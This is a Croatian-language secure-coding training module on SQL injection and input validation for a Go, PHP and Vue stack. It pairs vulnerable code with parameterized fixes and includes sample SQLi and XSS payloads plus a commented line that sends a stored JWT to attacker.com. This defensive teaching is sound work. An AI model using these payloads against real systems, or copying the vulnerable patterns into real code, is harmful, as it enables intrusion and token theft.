# 02 — SQL Injection i Input Validation

## Zašto SQL Injection Nije "Stara" Ranjivost

SQL injection je na OWASP Top 10 od prvog izdanja (2003) i i dalje je u A03:2021 (Injection). Svake godine pronađemo kritične SQLi ranjivosti u enterprise aplikacijama. Razlog: svaki novi developer koji dodaje feature može unijeti ranjivost, čak i u inače sigurnoj aplikaciji.

Za naš stack: **Go backend direktno komunicira s MySQL** — ovo je primarni SQLi rizik.

---

## SQL Injection u Go sa `database/sql`

### Ranjivi kod

```go
// NIKAD OVAKO:
func (r *UserRepository) FindByEmail(email string) (*User, error) {
    // email dolazi direktno iz HTTP request-a
    query := fmt.Sprintf("SELECT id, email, password_hash, role FROM users WHERE email = '%s'", email)
    row := r.db.QueryRow(query)
    
    var user User
    err := row.Scan(&user.ID, &user.Email, &user.PasswordHash, &user.Role)
    return &user, err
}
```

**Napad:** Email = `' OR '1'='1' --`

Generirani SQL:
```sql
SELECT id, email, password_hash, role FROM users WHERE email = '' OR '1'='1' --'
```

Rezultat: vraća prvog korisnika u bazi (obično admin). Bypass autentikacije.

**Napad 2 (Blind SQLi):** Email = `' AND SLEEP(5) --`

Go čeka 5 sekundi → potvrda da je SQLi ranjivost prisutna.

---

### Sigurni Kod — Prepared Statements

```go
// UVIJEK OVAKO:
func (r *UserRepository) FindByEmail(ctx context.Context, email string) (*User, error) {
    const query = `
        SELECT id, email, password_hash, role, created_at
        FROM users
        WHERE email = ?
        LIMIT 1
    `
    // db.QueryRowContext automatski koristi prepared statement
    // '?' je placeholder — MySQL driver ga tretira kao podatak, ne kao SQL
    row := r.db.QueryRowContext(ctx, query, email)
    
    var user User
    err := row.Scan(
        &user.ID,
        &user.Email,
        &user.PasswordHash,
        &user.Role,
        &user.CreatedAt,
    )
    if err == sql.ErrNoRows {
        return nil, ErrUserNotFound
    }
    return &user, err
}
```

**Zašto je ovo sigurno:** MySQL prima query i podatke odvojeno. `email` parametar se nikad ne interpetira kao SQL kod — tretira se kao string literal, bez obzira na sadržaj.

### INSERT s Prepared Statements

```go
func (r *UserRepository) Create(ctx context.Context, email, passwordHash string) (int64, error) {
    const query = `
        INSERT INTO users (email, password_hash, role, created_at)
        VALUES (?, ?, 'user', NOW())
    `
    result, err := r.db.ExecContext(ctx, query, email, passwordHash)
    if err != nil {
        // Provjeri duplicate email (MySQL error 1062)
        if isDuplicateKeyError(err) {
            return 0, ErrEmailAlreadyExists
        }
        return 0, fmt.Errorf("create user: %w", err)
    }
    return result.LastInsertId()
}
```

### Query s Više Parametara

```go
func (r *OrderRepository) FindByUserAndStatus(
    ctx context.Context,
    userID int64,
    status string,
) ([]*Order, error) {
    const query = `
        SELECT id, user_id, total, status, created_at
        FROM orders
        WHERE user_id = ?
          AND status = ?
          AND created_at > DATE_SUB(NOW(), INTERVAL 90 DAY)
        ORDER BY created_at DESC
        LIMIT 100
    `
    rows, err := r.db.QueryContext(ctx, query, userID, status)
    if err != nil {
        return nil, fmt.Errorf("find orders: %w", err)
    }
    defer rows.Close()
    
    var orders []*Order
    for rows.Next() {
        var o Order
        if err := rows.Scan(&o.ID, &o.UserID, &o.Total, &o.Status, &o.CreatedAt); err != nil {
            return nil, err
        }
        orders = append(orders, &o)
    }
    return orders, rows.Err()
}
```

---

## Second-Order SQL Injection

Ovo je podmukla varijanta koju junior developeri često propuštaju.

**Scenario:**

1. Korisnik se registruje s username-om: `admin'--`
2. Registracija koristi prepared statement — podatak se ispravno spremi u bazu
3. Later: admin UI dohvaća username iz baze i koristi ga u novom query-u BEZ prepared statementa

```go
// Ranjivi admin kod koji dohvaća username i koristi ga direktno:
func (r *AdminRepository) GetUserPermissions(ctx context.Context, userID int64) ([]string, error) {
    // Ovo je sigurno:
    row := r.db.QueryRowContext(ctx, "SELECT username FROM users WHERE id = ?", userID)
    var username string
    row.Scan(&username)
    
    // ALI OVO JE RANJIVO — username dolazi iz baze, ali nije trusted!
    query := fmt.Sprintf("SELECT permission FROM permissions WHERE username = '%s'", username)
    //                                                                            ^^^^^^^^^^
    //                        Ovaj username je 'admin'-- — injectuje se ovdje!
    rows, _ := r.db.QueryContext(ctx, query)
    // ...
}
```

**Fix:** Prepared statements SVUDA, čak i kad podatak dolazi iz vlastite baze.

```go
// Sigurno:
rows, err := r.db.QueryContext(ctx,
    "SELECT permission FROM permissions WHERE username = ?",
    username, // čak i ako dolazi iz baze — uvijek parametrizovano
)
```

---

## Dynamic WHERE Clauses — Česta Zamka

Šta kad imamo search endpoint s opcionalnim filterima?

```go
// RANJIVO — string concatenation:
func buildSearchQuery(filters SearchFilters) string {
    query := "SELECT * FROM products WHERE 1=1"
    if filters.Name != "" {
        query += " AND name LIKE '%" + filters.Name + "%'" // INJECTION!
    }
    if filters.Category != "" {
        query += " AND category = '" + filters.Category + "'" // INJECTION!
    }
    return query
}

// SIGURNO — sqlx ili ručno s args slice:
func (r *ProductRepository) Search(ctx context.Context, filters SearchFilters) ([]*Product, error) {
    query := "SELECT id, name, price, category FROM products WHERE active = 1"
    args := []interface{}{}
    
    if filters.Name != "" {
        query += " AND name LIKE ?"
        args = append(args, "%"+filters.Name+"%")
        // NAPOMENA: % wildcards su izvan parametra — to je ispravno
        // Parametar je cijeli string s wildcard-ovima, ne samo unos
    }
    if filters.Category != "" {
        query += " AND category = ?"
        args = append(args, filters.Category)
    }
    if filters.MinPrice > 0 {
        query += " AND price >= ?"
        args = append(args, filters.MinPrice)
    }
    
    query += " ORDER BY created_at DESC LIMIT 50"
    
    rows, err := r.db.QueryContext(ctx, query, args...)
    // ...
}
```

---

## NIKAD `LIKE '%$input%'` bez Sanitizacije

Čak i s prepared statements, LIKE pattern može biti problematičan — ne zbog SQL injection, nego zbog **ReDoS** (Regular Expression Denial of Service) i **wildcard abuse**:

```go
// Korisnik unese: "%" ili "_%" ili "%%%%%" 
// MySQL tretira % kao wildcard u LIKE — vraća SVE redove!

// Fix — escape LIKE wildcards:
func escapeLikePattern(s string) string {
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, "%", "\\%")
    s = strings.ReplaceAll(s, "_", "\\_")
    return s
}

// Korištenje:
query += " AND name LIKE ?"
args = append(args, "%"+escapeLikePattern(filters.Name)+"%")
```

---

## Input Validation u Go

Validation nije alternativa prepared statements — **oboje su obavezni**. Validation sprječava garbage data u bazi i daje korisne error poruke.

```go
package validation

import (
    "errors"
    "regexp"
    "unicode/utf8"
)

var (
    ErrEmailTooLong     = errors.New("email must be 255 characters or less")
    ErrInvalidEmail     = errors.New("invalid email format")
    ErrPasswordTooShort = errors.New("password must be at least 8 characters")
    ErrPasswordTooLong  = errors.New("password must be 128 characters or less")
    ErrPasswordWeak     = errors.New("password must contain uppercase, lowercase, and a number")
)

// emailRegex pokriva RFC 5321 osnove (ne pun RFC 5322 — previše kompleksan)
var emailRegex = regexp.MustCompile(`^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$`)

func validateLoginInput(email, password string) error {
    // Email validacija
    if utf8.RuneCountInString(email) > 255 {
        return ErrEmailTooLong
    }
    if !emailRegex.MatchString(email) {
        return ErrInvalidEmail
    }
    
    // Password validacija
    passwordLen := utf8.RuneCountInString(password)
    if passwordLen < 8 {
        return ErrPasswordTooShort
    }
    if passwordLen > 128 {
        // bcrypt truncate-uje na 72 bajta — 128 char limit je sigurnosna mjera
        // i sprječava DoS s ogromnim passwordima
        return ErrPasswordTooLong
    }
    
    return nil
}

// Jači password zahtjevi za registration endpoint:
func validateRegistrationPassword(password string) error {
    if err := validateLoginInput("x@x.com", password); err != nil && err != ErrInvalidEmail {
        return err
    }
    
    var hasUpper, hasLower, hasDigit bool
    for _, r := range password {
        switch {
        case r >= 'A' && r <= 'Z':
            hasUpper = true
        case r >= 'a' && r <= 'z':
            hasLower = true
        case r >= '0' && r <= '9':
            hasDigit = true
        }
    }
    
    if !hasUpper || !hasLower || !hasDigit {
        return ErrPasswordWeak
    }
    return nil
}
```

### Validation u HTTP Handler-u

```go
func (h *AuthHandler) Login(c *gin.Context) {
    var req LoginRequest
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": "invalid request body"})
        return
    }
    
    // Validacija prije bilo čega drugog
    if err := validateLoginInput(req.Email, req.Password); err != nil {
        // Vrati generičku grešku — ne otkrivaj koji dio je neispravan
        // (napadač ne treba znati koji email-ovi postoje)
        c.JSON(400, gin.H{"error": "invalid credentials format"})
        return
    }
    
    // Normalize email (lowercase) — sigurnosna i UX mjera
    email := strings.ToLower(strings.TrimSpace(req.Email))
    
    // Dalje s autentikacijom...
}
```

---

## Input Validation u PHP

PHP proxy prima request od frontend-a i prosljeđuje na Go backend — ali treba i sam validirati.

```php
<?php

namespace App\Middleware;

class InputValidationMiddleware
{
    public function process(Request $request, RequestHandler $handler): Response
    {
        $body = $request->getParsedBody();
        
        // Email validacija — PHP ugrađeni filter
        if (isset($body['email'])) {
            $email = filter_var($body['email'], FILTER_VALIDATE_EMAIL);
            if ($email === false) {
                return $this->errorResponse('Invalid email format', 400);
            }
            // Maksimalna dužina
            if (strlen($email) > 255) {
                return $this->errorResponse('Email too long', 400);
            }
        }
        
        // Integer validacija
        if (isset($body['user_id'])) {
            $userId = filter_var($body['user_id'], FILTER_VALIDATE_INT, [
                'options' => ['min_range' => 1, 'max_range' => PHP_INT_MAX]
            ]);
            if ($userId === false) {
                return $this->errorResponse('Invalid user ID', 400);
            }
        }
        
        // URL validacija (za webhook-ove, link previews)
        if (isset($body['callback_url'])) {
            $url = filter_var($body['callback_url'], FILTER_VALIDATE_URL);
            if ($url === false) {
                return $this->errorResponse('Invalid URL', 400);
            }
            // Dodatno: provjeri da URL nije interni (SSRF zaštita)
            $this->validateNotInternalUrl($url);
        }
        
        return $handler->handle($request);
    }
    
    private function validateNotInternalUrl(string $url): void
    {
        $host = parse_url($url, PHP_URL_HOST);
        $ip = gethostbyname($host);
        
        if (filter_var($ip, FILTER_VALIDATE_IP, 
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            throw new \InvalidArgumentException('Internal URLs not allowed');
        }
    }
}
```

### PHP filter_var() Cheat Sheet

```php
// Email
$email = filter_var($input, FILTER_VALIDATE_EMAIL);

// Integer (s range)
$id = filter_var($input, FILTER_VALIDATE_INT, ['options' => ['min_range' => 1]]);

// Float
$price = filter_var($input, FILTER_VALIDATE_FLOAT);

// Boolean
$active = filter_var($input, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE);

// URL
$url = filter_var($input, FILTER_VALIDATE_URL);

// IP adresa
$ip = filter_var($input, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);

// Sanitize (ukloni opasne znakove)
$clean = filter_var($input, FILTER_SANITIZE_SPECIAL_CHARS);
```

---

## Vue.js: `v-html` Je Opasan

Vue.js automatski escape-uje tekst u `{{ }}` interpolaciji. Ali `v-html` renderuje sirovi HTML.

```vue
<template>
  <!-- SIGURNO — Vue escape-uje HTML znakove -->
  <p>{{ userComment }}</p>
  <!-- Output: &lt;script&gt;alert(1)&lt;/script&gt; — prikazano kao tekst -->

  <!-- OPASNO — renderuje sirovi HTML -->
  <div v-html="userComment"></div>
  <!-- Output: <script>alert(1)</script> — izvršava se! XSS! -->
  
  <!-- OPASNO — dinamički style/class atributi s user inputom -->
  <div :style="userProvidedStyle"></div>
</template>
```

### Kad Morate Koristiti `v-html`

Ako morate renderovati formatiran tekst (npr. rich text editor output):

```javascript
// npm install dompurify
import DOMPurify from 'dompurify'

// U composable-u:
export function useSafeHtml(rawHtml) {
  const safeHtml = computed(() => {
    return DOMPurify.sanitize(rawHtml.value, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: [], // ne dopuštamo atribute (href, onclick, itd.)
    })
  })
  return { safeHtml }
}

// U komponenti:
const { safeHtml } = useSafeHtml(articleContent)
// <div v-html="safeHtml"></div> — sada je sigurno
```

### localStorage vs Cookies za JWT

Ovo je direktno vezano za SQL/XSS ranjivosti:

```javascript
// RANJIVO — localStorage je dostupan bilo kom JS kodu na stranici
localStorage.setItem('access_token', jwt)
// Ako ima XSS ranjivosti: document.cookie ne radi, ali:
// fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))

// SIGURNIJE — httpOnly cookie (nije dostupan JS kodu)
// Backend postavlja: Set-Cookie: refresh_token=xxx; HttpOnly; Secure; SameSite=Strict
// JavaScript ne može pročitati cookie s HttpOnly flagom
```

**Kompromis za naš stack:**
- Access token (15 min): može biti u memoriji (JavaScript varijabla) — ne persists kroz refresh
- Refresh token (7 dana): httpOnly cookie — nije dostupan JS-u, siguran od XSS

---

## Parameterized Queries vs ORM

Oba pristupa su sigurna — **ako su ispravno korišćeni**.

### Go sa `database/sql` (direktno)

```go
// Sigurno — prikazano gore
db.QueryRowContext(ctx, "SELECT id FROM users WHERE email = ?", email)
```

### Go sa `sqlx` (wrapper koji dodaje convenience)

```go
import "github.com/jmoiron/sqlx"

// Named parameters — čitljiviji za kompleksne query-ije
type UserFilter struct {
    Email  string `db:"email"`
    Role   string `db:"role"`
}

filter := UserFilter{Email: email, Role: "admin"}
rows, err := db.NamedQueryContext(ctx,
    "SELECT * FROM users WHERE email = :email AND role = :role",
    filter,
)
```

### GORM (Go ORM)

```go
import "gorm.io/gorm"

// SIGURNO — GORM automatski koristi prepared statements
db.Where("email = ?", email).First(&user)

// SIGURNO — struct condition
db.Where(&User{Email: email, Role: "admin"}).Find(&users)

// RANJIVO — raw SQL bez parametara (moguće u GORM-u!)
db.Raw("SELECT * FROM users WHERE email = '" + email + "'").Scan(&user) // NE RADITI!

// SIGURNO — raw SQL s parametrima
db.Raw("SELECT * FROM users WHERE email = ?", email).Scan(&user)
```

### PHP sa PDO

```php
// SIGURNO — PDO prepared statement
$stmt = $pdo->prepare("SELECT id, email FROM users WHERE email = :email");
$stmt->execute([':email' => $email]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// RANJIVO — string concatenation (čak i u PDO-u moguće!)
$stmt = $pdo->query("SELECT * FROM users WHERE email = '$email'"); // NE RADITI!
```

---

## Checklist za Code Review

Svaki put kada reviewuješ kod koji se tiče baze podataka, provjeri:

- [ ] Svi SQL query-ji koriste `?` placeholders (Go) ili `:param` (PHP PDO)
- [ ] Nema `fmt.Sprintf` ili string concatenacije u SQL query-jima
- [ ] Dynamic WHERE clauses koriste `args := []interface{}{}` pattern
- [ ] LIKE wildcards su ispravno escaped (ne samo parametrizovani)
- [ ] Input validation postoji PRIJE SQL operacija
- [ ] Email se normalizuje (lowercase) prije pohrane i pretrage
- [ ] Password dužina je ograničena na max 128 znakova (bcrypt limit)
- [ ] `v-html` u Vue.js komponentama je provjeren — postoji li DOMPurify?

Automated SAST (Semgrep pravilo u modulu 06) će uhvatiti `fmt.Sprintf` + SQL pattern automatski.
